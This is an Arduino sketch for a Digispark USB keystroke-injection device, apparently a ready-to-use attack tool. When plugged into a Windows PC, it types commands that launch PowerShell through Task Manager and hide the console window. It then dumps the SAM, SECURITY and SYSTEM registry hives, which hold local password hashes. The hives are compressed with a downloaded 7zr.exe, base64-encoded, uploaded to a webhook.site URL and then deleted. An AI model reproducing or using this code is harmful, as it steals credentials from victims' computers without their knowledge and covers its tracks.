#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 
#define KEY_ENTER 0x28 
#define KEY_TAB 0x2b

//coded by @g0dmax55

void setup() {
  pinMode(1, OUTPUT);  
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("PowerShell.exe -NoExit -Command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(200); 
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); 
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.println("taskkill /IM taskmgr.exe /F");
  DigiKeyboard.println("cd $env:temp");   
  DigiKeyboard.delay(300);
  DigiKeyboard.println("Invoke-WebRequest -Uri \"https://www.7-zip.org/a/7zr.exe\" -OutFile 7zr.exe");
  DigiKeyboard.delay(200);  
  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {reg save HKLM\\SAM SA.B; reg save HKLM\\security SE.B; reg save HKLM\\system SY.B; .\\7zr.exe a -t7z -mx=9 -mfb=273 -md=1536m -ms=on -mmt=on reg.7z .\\SA.B .\\SY.B .\\SE.B; $U='https://webhook.site/5e5a6ef5-3aab-4861-9f9a-8227f97f3ccc'; certutil -encode -f reg.7z reg.7z; Invoke-RestMethod -Uri $U -Method POST -InFile reg.7z -ContentType \"multipart/form-data\";del *.B;del reg.7z;del 7zr.exe;exit}"));
  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
